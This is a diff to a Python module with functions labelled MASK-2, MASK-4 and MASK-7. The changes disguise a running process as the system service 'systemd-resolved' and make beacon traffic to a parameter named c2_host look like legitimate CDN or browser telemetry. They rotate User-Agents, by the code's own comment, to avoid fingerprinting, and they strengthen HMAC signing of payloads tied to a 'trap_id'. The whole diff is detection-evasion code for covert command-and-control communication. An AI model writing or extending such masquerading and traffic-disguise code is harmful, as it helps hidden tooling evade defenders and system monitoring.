@@ -9,8 +9,13 @@ import string
 def masquerade_process(process_name: str = "systemd-resolved"):
     """
     MASK-4: Obfuscates process identity in process list.
-    Attempts to rename process title via ctypes on Linux or setproctitle if installed.
+    Attempts to rename process title via setproctitle or ctypes prctl on Linux.
     """
+    try:
+        import setproctitle
+        setproctitle.setproctitle(process_name)
+    except Exception:
+        pass
     try:
         if sys.platform.startswith("linux"):
             import ctypes
@@ -37,12 +42,19 @@ def generate_dummy_padding(min_bytes: int = 32, max_bytes: int = 128) -> str:
     length = random.randint(min_bytes, max_bytes)
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def get_disguised_headers(c2_host: str = "cdn.edge-telemetry.org") -> dict:
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
+]
+
+def get_disguised_headers(c2_host: str = "static-edge") -> dict:
     """
-    MASK-2: HTTP headers simulating legitimate CDN/browser telemetry beacon
+    MASK-2: HTTP headers simulating legitimate CDN/browser telemetry beacon.
+    Rotates authentic User-Agents to prevent static fingerprinting.
     """
     return {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "User-Agent": random.choice(USER_AGENTS),
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9",
         "Content-Type": "application/json",
@@ -52,9 +64,17 @@ def get_disguised_headers(c2_host: str = "cdn.edge-telemetry.org") -> dict:
         "Pragma": "no-cache"
     }
 
-def sign_telemetry_payload(trap_id: str, timestamp: float, nonce: str, secret_key: str) -> str:
+def sign_telemetry_payload(
+    trap_id: str,
+    timestamp: float,
+    nonce: str,
+    secret_key: str,
+    raw_body: bytes = b""
+) -> str:
     """
-    MASK-7: Generates HMAC-SHA256 signature for mutual authentication and replay prevention
+    MASK-7: Generates HMAC-SHA256 signature for mutual authentication and replay prevention.
+    Includes SHA-256 hash of the payload body (or empty bytes for GET requests).
     """
-    data_to_sign = f"{trap_id}:{timestamp}:{nonce}".encode()
-    return hmac.new(secret_key.encode(), data_to_sign, hashlib.sha256).hexdigest()
+    body_hash = hashlib.sha256(raw_body).hexdigest()
+    data_to_sign = f"{trap_id}:{timestamp}:{nonce}:{body_hash}".encode("utf-8")
+    return hmac.new(secret_key.encode("utf-8"), data_to_sign, hashlib.sha256).hexdigest()
